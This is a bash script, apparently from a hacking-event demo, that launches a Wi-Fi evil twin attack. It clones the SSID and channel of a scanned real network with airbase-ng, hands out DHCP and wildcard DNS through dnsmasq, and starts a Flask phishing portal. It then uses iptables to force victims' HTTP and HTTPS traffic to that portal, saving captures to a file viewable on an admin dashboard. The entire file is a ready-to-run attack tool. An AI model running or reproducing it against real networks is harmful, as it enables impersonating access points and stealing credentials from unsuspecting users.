#!/usr/bin/env bash
# HackTech Lightning 2026 — Evil Twin demo launcher
# Brings up: monitor mode -> airbase-ng (fake AP) -> at0 IP -> dnsmasq -> apache portal -> iptables redirect
# Run with sudo: sudo ./start-evil-twin.sh
# Ctrl-C this script's dnsmasq stays attached to this terminal; airbase-ng runs in background.
# Use ./stop-evil-twin.sh to tear everything down.

set -euo pipefail

SSID="${ET_SSID:-}"                          # REQUIRED — ops/console sets it from the SCANNED target (no hardcoded name)
CHANNEL="${ET_CHANNEL:-}"                     # REQUIRED — comes from that target's real channel
IFACE="${ET_IFACE:-wlan1}"                   # AR9271 (ath9k_htc); wlan0 here is the Intel net card — leave it online
MONIFACE="$IFACE"                            # NM-safe monitor keeps the same name
AT0_IP="10.0.0.1/24"
DNSMASQ_CONF="/etc/dnsmasq-portal.conf"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
PORTAL="$SCRIPT_DIR/portal/evil_portal.py"
LOG_DIR="/tmp/evil-twin-logs"
PIDFILE_AIRBASE="/tmp/evil-twin-airbase.pid"
PIDFILE_PORTAL="/tmp/evil-twin-portal.pid"

if [[ $EUID -ne 0 ]]; then
  echo "Run this with sudo: sudo $0"
  exit 1
fi

# No hardcoded target: SSID + channel MUST come from a live recon pick (ET_SSID/ET_CHANNEL).
if [[ -z "$SSID" ]]; then
  echo "ERROR: ET_SSID is empty. Pick a target from the recon scan first — nothing is hardcoded."
  echo "       e.g. sudo ET_SSID='Some-Scanned-SSID' ET_CHANNEL=6 $0"
  exit 1
fi
if ! [[ "$CHANNEL" =~ ^[0-9]+$ ]] || (( CHANNEL < 1 || CHANNEL > 14 )); then
  echo "ERROR: ET_CHANNEL must be the scanned target's channel (1-14), got '${CHANNEL:-unset}'."
  exit 1
fi

mkdir -p "$LOG_DIR"

echo "[1/7] Checking adapter..."
if ! lsusb | grep -qiE 'atheros|ar9271'; then
  echo "  AR9271 not detected via lsusb. Attach the USB device to the VM first."
  exit 1
fi
echo "  OK: adapter present."

echo "[2/7] Releasing $IFACE from NetworkManager (other adapters stay online)..."
# Only this adapter is released — no 'airmon-ng check kill', so wlan0's internet survives.
nmcli device set "$IFACE" managed no 2>/dev/null || true

echo "[3/7] Enabling monitor mode on $IFACE..."
ip link set "$IFACE" down
iw dev "$IFACE" set type monitor
ip link set "$IFACE" up
iw dev "$IFACE" set channel "$CHANNEL"
if ! iw dev "$IFACE" info 2>/dev/null | grep -q 'type monitor'; then
  echo "  ERROR: $IFACE did not enter monitor mode. Check 'iw dev'."
  exit 1
fi
echo "  OK: $IFACE is in monitor mode on channel $CHANNEL."

echo "[4/7] Starting airbase-ng (SSID=$SSID, channel=$CHANNEL) in background..."
nohup airbase-ng -e "$SSID" -c "$CHANNEL" "$MONIFACE" > "$LOG_DIR/airbase.log" 2>&1 &
echo $! > "$PIDFILE_AIRBASE"
sleep 4

if ! ip link show at0 >/dev/null 2>&1; then
  echo "  ERROR: at0 did not appear. Check $LOG_DIR/airbase.log"
  exit 1
fi
echo "  OK: airbase-ng running (pid $(cat $PIDFILE_AIRBASE)), at0 created."

echo "[5/7] Assigning $AT0_IP to at0..."
ip addr flush dev at0 2>/dev/null || true
ip addr add "$AT0_IP" dev at0
ip link set at0 up
echo "  OK."

echo "[6/7] Starting dnsmasq..."
if [[ ! -f "$DNSMASQ_CONF" ]]; then
  tee "$DNSMASQ_CONF" > /dev/null <<'CFG'
interface=at0
bind-interfaces
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
address=/#/10.0.0.1
CFG
  echo "  Wrote $DNSMASQ_CONF"
else
  echo "  $DNSMASQ_CONF already exists, leaving it as-is."
fi
systemctl stop dnsmasq 2>/dev/null || true
systemctl disable dnsmasq 2>/dev/null || true
pkill -f "dnsmasq -C $DNSMASQ_CONF" 2>/dev/null || true
nohup dnsmasq -C "$DNSMASQ_CONF" --no-daemon --log-queries > "$LOG_DIR/dnsmasq.log" 2>&1 &
echo $! > /tmp/evil-twin-dnsmasq.pid
sleep 1
echo "  OK: dnsmasq running (pid $(cat /tmp/evil-twin-dnsmasq.pid)), logging to $LOG_DIR/dnsmasq.log"

echo "[7/7] Launching captive portal (Flask) + iptables..."
if [[ ! -f "$PORTAL" ]]; then
  echo "  ERROR: portal not found at $PORTAL"
  exit 1
fi
# free port 80 in case apache/nginx grabbed it, and clear any old portal
systemctl stop apache2 nginx 2>/dev/null || true
pkill -f "evil_portal.py" 2>/dev/null || true
# ADMIN_TOKEN (optional) protects the dashboard: sudo ADMIN_TOKEN=xxx ./start-evil-twin.sh
nohup python3 "$PORTAL" > "$LOG_DIR/portal.log" 2>&1 &
echo $! > "$PIDFILE_PORTAL"
sleep 2
if ! kill -0 "$(cat "$PIDFILE_PORTAL")" 2>/dev/null; then
  echo "  ERROR: portal failed to start. Check $LOG_DIR/portal.log"
  exit 1
fi
echo "  OK: portal running (pid $(cat "$PIDFILE_PORTAL")), logging to $LOG_DIR/portal.log"

iptables -t nat -F
iptables -t nat -A PREROUTING -i at0 -p tcp --dport 80  -j DNAT --to-destination 10.0.0.1:80
iptables -t nat -A PREROUTING -i at0 -p tcp --dport 443 -j DNAT --to-destination 10.0.0.1:80
iptables -A INPUT -i at0 -j ACCEPT
echo "  OK: iptables redirecting victim web traffic -> portal on 10.0.0.1:80"

KIP="$(ip -4 -o addr show 2>/dev/null | grep -vE ' (lo|at0)' | grep -oP 'inet \K[0-9.]+' | grep -v '^10\.0\.0\.' | head -1)"
echo ""
echo "=== Evil twin '$SSID' is LIVE on channel $CHANNEL ==="
echo "Logs: $LOG_DIR/{airbase,dnsmasq,portal}.log"
echo "Test the portal:   curl http://10.0.0.1/anything"
echo "Capture dashboard: http://127.0.0.1/admin  (on this Kali box)"
[[ -n "$KIP" ]] && echo "                   http://$KIP/admin  (from another device on the LAN)"
echo "Captures saved to: $SCRIPT_DIR/portal/captures.jsonl"
echo "Stop everything with: sudo ./stop-evil-twin.sh"
